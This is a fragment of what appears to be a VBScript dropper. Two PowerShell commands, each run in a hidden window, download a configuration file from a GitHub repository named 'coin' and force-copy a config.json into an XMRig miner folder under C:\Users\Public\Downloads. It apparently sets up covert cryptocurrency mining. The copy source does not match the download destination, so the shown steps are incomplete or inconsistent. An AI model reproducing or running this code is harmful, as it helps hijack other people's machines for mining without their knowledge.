...
objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/config.json -OutFile C:\Users\Public\Downloads\config.json", 0, True
...
objShell.Run "powershell.exe -Command Copy-Item -Path C:\config.json -Destination C:\Users\Public\Downloads\xmrig-6.22.2\config.json -Force", 0, True
